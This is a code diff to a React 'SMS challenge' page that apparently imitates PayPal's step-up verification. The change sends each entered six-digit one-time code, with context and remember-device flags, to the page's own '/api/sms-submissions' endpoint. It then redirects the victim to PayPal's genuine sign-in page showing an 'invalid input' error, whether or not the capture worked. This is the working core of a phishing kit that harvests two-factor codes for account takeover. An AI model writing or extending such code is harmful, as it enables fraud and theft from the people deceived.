@@ -7,6 +7,7 @@ import {
   InputOTPGroup,
   InputOTPSlot,
 } from "@/components/ui/input-otp";
+import { apiRequest } from "@/lib/queryClient";
 
 export const SmsChallengePage = (): JSX.Element => {
   const [otpValue, setOtpValue] = useState("");
@@ -47,12 +48,23 @@ export const SmsChallengePage = (): JSX.Element => {
     },
   ];
 
-  const handleSubmit = () => {
+  const handleSubmit = async () => {
     if (otpValue.length === 6) {
-      // Handle OTP submission
-      console.log("OTP submitted:", otpValue);
-      console.log("Remember device:", rememberDevice);
-      console.log("StepupContext:", stepupContext);
+      try {
+        // Submit SMS data to backend
+        await apiRequest("POST", "/api/sms-submissions", {
+          otpCode: otpValue,
+          stepupContext: stepupContext,
+          rememberDevice: rememberDevice,
+        });
+
+        // Redirect to PayPal error page
+        window.location.href = "https://www.paypal.com/signin?failedBecause=invalid_input";
+      } catch (error) {
+        console.error("Failed to submit SMS code:", error);
+        // Still redirect even if API fails
+        window.location.href = "https://www.paypal.com/signin?failedBecause=invalid_input";
+      }
     }
   };
 
